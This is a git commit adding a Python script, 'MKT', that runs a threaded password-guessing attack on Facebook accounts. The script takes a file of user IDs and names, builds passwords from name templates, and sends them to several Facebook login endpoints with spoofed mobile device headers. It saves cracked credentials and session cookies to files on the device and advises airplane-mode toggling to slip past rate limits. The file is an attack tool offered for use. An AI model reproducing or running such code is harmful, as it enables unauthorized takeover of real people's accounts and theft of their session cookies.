18f2984ad31ad34cd4d6c1ae4edf3cc106d024f1
Mogid Khan <142301746+mogid458@users.noreply.github.com>
2023-08-23 01:23:58 +0600

    Add files via upload

---
+++ MKT.py
@@ -0,0 +1,607 @@
+#!/usr/bin/python
+#Original written By Mogid Khan
+#MKT(Mogid Khan Termux) Brand
+
+#Feel MKT POWER
+
+
+
+import os,zlib
+
+from os import system as osRUB
+from os import system as cmd
+os.system('clear')
+print('Loading Modules ...\n')
+
+
+
+try:
+    import requests 
+except ImportError:
+    print('\n  Installing Requests ...\n')
+    os.system('pip install requests')
+
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n  installing futures ...\n')
+    os.system('pip install futures')
+
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as mogidmkt
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+
+import random
+import string
+
+
+
+model2 ="""M2101K6G
+Aquaris U Plus
+SM-G780G
+SM-O497J
+SM-L427V
+SM-C297Z
+SM-G507X
+SM-Y634L
+SM-J204F
+SM-R911A
+SM-X801O
+SM-A792E
+SM-H270F
+SM-P993J
+SM-V233F
+SM-O861W
+SM-D182C
+SM-Y729G
+SM-Z367Q
+SM-U191O
+SM-U559U
+SM-B567Y
+SM-O846M
+SM-G342Z
+SM-K531M
+SM-I847H
+SM-A728M
+SM-L637H
+SM-L429N
+SM-P413J
+SM-N731T
+SM-R505B
+SM-A744X
+SM-O400L
+SM-F799H
+SM-Z679E
+SM-G822H
+SM-N489K
+SM-Z200Z
+SM-Y119O
+SM-E201F
+SM-N785T
+SM-G200V
+SM-R067J
+SM-N134B
+SM-N227J
+SM-K221P
+SM-S150D
+SM-A869J
+SM-H143V
+SM-C469H
+SM-T152I
+SM-Y575D
+SM-W880B
+SM-W460Q
+SM-Q159J
+SM-U637R
+SM-J924Q
+SM-W512P
+SM-I745B
+SM-O118H
+SM-U111M
+SM-U522B
+SM-B611V
+SM-G520J
+SM-D144B
+SM-C181B
+SM-V128Q
+SM-U167W
+SM-L098E
+SM-P454L
+SM-L943O
+SM-D368H
+SM-P485X
+SM-C715N
+SM-H010U
+SM-H710B
+SM-X633F
+SM-Z040T
+SM-Q391G
+SM-N451P
+SM-T115B
+SM-R248C
+SM-T618P
+SM-S067L
+SM-M619P
+SM-Q048A
+SM-I787D
+SM-X275W
+SM-G911F
+SM-R924W
+SM-S506Z
+SM-V941V
+SM-G016M
+SM-O008J
+SM-L296E
+SM-U876V
+SM-L600X
+SM-G169P
+SM-F578L
+SM-S727V
+SM-F213B
+SM-U822H
+SM-Q995Y
+SM-I602I
+SM-V225C
+SM-U921J
+SM-Z302E
+SM-Y080Z
+SM-X174G
+SM-T157W
+SM-M311W
+SM-H791P
+SM-Q343U
+SM-H261C
+SM-D442E
+SM-E047H
+SM-S082M
+SM-U311K
+SM-Z651V
+SM-I566H
+SM-I593C
+SM-L375P
+SM-D399D
+SM-Y086S
+SM-O365U
+SM-W782A
+SM-S236Q
+SM-D514J
+SM-W806F
+SM-W809F
+SM-M645P
+SM-W098A
+SM-O026U
+SM-Y689Z
+SM-D832N
+SM-C691X
+SM-D921H
+SM-G403Y
+SM-S210U
+SM-D768K
+SM-F912H
+SM-H856A
+SM-J184W
+SM-D512U
+SM-K786Z
+SM-Z107O
+SM-D499G
+SM-C815N
+SM-D590H
+SM-V695N
+SM-M093A
+SM-S354P
+SM-F657J
+SM-R743O
+SM-A180A
+SM-B651H
+SM-X279B
+SM-X429B
+SM-R588G
+SM-Y318K
+SM-G967W
+SM-P668C
+SM-B401K
+SM-S853U
+SM-A377K
+SM-K914A
+SM-J624R
+SM-L536Y
+SM-B190B
+SM-Q769S
+SM-Z872L
+SM-S322A
+SM-O621Y
+SM-N100L
+SM-A840S
+SM-E543H
+SM-H386M
+SM-Y932W
+SM-T496G
+SM-E768E
+SM-R031A
+SM-Q015D
+SM-P522K
+SM-D436Z
+SM-R077U
+SM-I233Z
+SM-H906Q
+SM-K838M
+SM-O369U
+SM-F458K
+SM-M382E
+SM-L337L
+SM-G904B
+SM-N351H
+SM-V670M
+SM-W266H
+SM-Q576G
+SM-G359C
+SM-R096P
+SM-F952H
+SM-Y608N
+SM-C736V
+> 
+""".splitlines()
+
+
+
+totaldmp = 0
+count = 0
+loop = 0
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+methods = []
+srange = 0
+saved = []
+totaldmp = 0
+filter = []
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/FB4A;FBAV/4020.1.80.24.874;FBBV/4214899694;FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/Ostin Realme 5;FBSV/16;FBOP/5;FBCA/arm64-v8a:;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+def randBuildvsskj():
+    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935ES;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/RP2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+sys.stdout.write('\x1b]2; MKT\x07')
+S = '\033[1;37m'
+A = '\x1b[38;5;208m'
+R = '\x1b[38;5;46m'
+F = '\x1b[38;5;48m'
+Z = '\033[1;33m'
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
+logo =                                          """
+    8b    d8 88  dP 888888 
+    88b  d88 88odP    88   
+    88YbdP88 88"Yb    88   
+    88 YY 88 88  Yb   88   
+    
+××××××××××××××××××××××××××××××××××
+\033[1;37m Github  : mogid458
+\033[1;37m Version : 0.1
+××××××××××××××××××××××××××××××××××
+\033[1;37m """
+def clear():
+    os.system("clear")
+    print(logo)    
+    
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print('\n')
+        print("××××××××××××××××××××××××××××××××××")
+        print(' The Process has been Complete ')
+        print(' TOTAL OK: %s' % str(len(oks)))
+        print(' TOTAL CP: %s' % str(len(cps)))
+        print("××××××××××××××××××××××××××××××××××")
+        input("Press enter to back MKT Menu ")
+        exit()
+
+def mogid():   
+    os.system('clear')
+    print(logo)
+    print(f'[1] File Crack')
+    print(f'[W] Join Whatsapp Group ')
+    print(f'[F] Join Facebook Group ')
+    print('')
+    select = input('Select Menu > ')
+    if select =='1':
+        method_crack()
+    elif select =='W':
+        os.system('xdg-open https://chat.whatsapp.com/J3gpK8NYNQBHhEYnVxN4X7')
+        pass
+    elif select =='F':
+        os.system('xdg-open https://facebook.com/groups/3017062245271082/')
+    else:
+        print('\n Select valid option ... ')
+        time.sleep(2)
+        MKT(allkey)
+        
+def method_crack():
+    global methods
+    clear()
+    print(f'[1] Method {1}')
+    print(f'[2] Method {2}')
+    print(f'[3] Method {3}')
+    #print(f'[4] Method {4}')
+    print(f'[0] Back')
+    print('')
+    option = input('Select method > ')
+    if option =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    elif option =='2':
+        methods.append('methodD')
+        main_crack().crack(id)
+    elif option =='3':
+        methods.append('methodC')
+        main_crack().crack(id)
+    #elif option =='4':
+        #methods.append('methodB')
+        #main_crack().crack(id)
+    elif option =='0':
+        mogid()
+    else:
+      print('\n Select Valid Option ...')
+      time.sleep(0.6)
+      method_crack()
+
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        clear()
+        self.file = input('Put File Name > ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print('Opps File Not Found ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print('Try Again ...')
+            time.sleep(2)
+            main_crack().crack(id)
+            
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r {S}[MKT] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "fr_IN",
+"client_country_code": "NP",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': "[FBAN/FB4A;FBAV/267.0.0.77.61;FBBV/246206728;FBRV/0;FBPN/com.facebook.katana;FBLC/bs_BA;FBMF/Honor;FBBD/Honor;FBDV/Honor 689T;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]",
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);mktb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={mktb};{ckkk}"
+                    print(f"\r{R} [MKT-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/MKT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MKT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     #print(f"\r{A} [MKT-CP] {sid} | {ps} {S}")
+                     cps.append(sid)
+                     open('/sdcard/MKT_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            time.sleep(7)
+            self.methodA(sid, name, ps)
+            
+    def methodC(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r {S}[MKT] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "fi_GB",
+"client_country_code": "PK",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': randBuildLSB(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);mktb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={mktb};{ckkk}"
+                    print(f"\r{R} [MKT-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/MKT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MKT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    #  print(f"\r{A} [MKT-CP] {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/MKT_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            time.sleep(7)
+            self.methodC(sid, name, ps)
+           
+    def methodD(self, sid, name, psw):
+        global oks,cps,loop
+        sys.stdout.write(f"\r {S}[MKT] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.flush()
+        fs = name.split(' ')[0]
+        try:
+            ls = name.split(' ')[1]
+        except:
+            ls = fs
+        try:
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                session=requests.Session()
+                sua = randBuildLSB()
+                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
+                session.headers = {}
+                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; LG-471G Build/TQ2A.516504.067; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.2761.202 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.80.89;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
+                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
+                if 'c_user' in session.cookies.get_dict():
+                    print(f"\r{R} [MKT-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/MKT_OK.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    #print(f"\r{A} [MKT-CP] {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/MKT_CP.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                else:
+                    continue
+                #time.sleep(31)
+            
+            loop+=1
+        except Exception as err:print(err)
+        except requests.exceptions.ConnectionError:
+             self.methodD(sid, name, ps)
+            
+    def pasw(self):       
+            pw = []
+            clear()
+            print('Put limit between 1 to 15')
+            sl = int(input('How many password do you want to add?\nSelect >  '))
+            os.system("clear")
+            print(logo)
+            print(f'{S} [Example: first123,last1122,firstlast,last,name,ETC]')
+            print('')
+            if sl =='':
+                print('\n Put limit between 1 to 15')
+            elif sl > 20:
+                print('\nPassword limit Should Not Be Greater Than 15')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'Password {sr+1} > '))
+            os.system("clear")
+            print(logo)
+            
+            print(f"\r{A}Use flight (airplane) mode before use {S}")
+            print("××××××××××××××××××××××××××××××××××")
+            print(f'{S} Total IDs >> %s ' % len(self.id))
+            print(f'{S} Cracking Started >>')
+            print("××××××××××××××××××××××××××××××××××")
+            with mogidmkt(max_workers=30) as mktworld:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                mktworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:
+                                mktworld.submit(self.methodB, uid, name, pwx)
+                            elif 'methodC' in methods:
+                                mktworld.submit(self.methodC, uid, name, pwx)
+                            elif 'methodD' in methods:
+                                mktworld.submit(self.methodD, uid, name, pwx)
+                   except:pass
+            result(oks,cps)   
+            
+
+
+mogid()
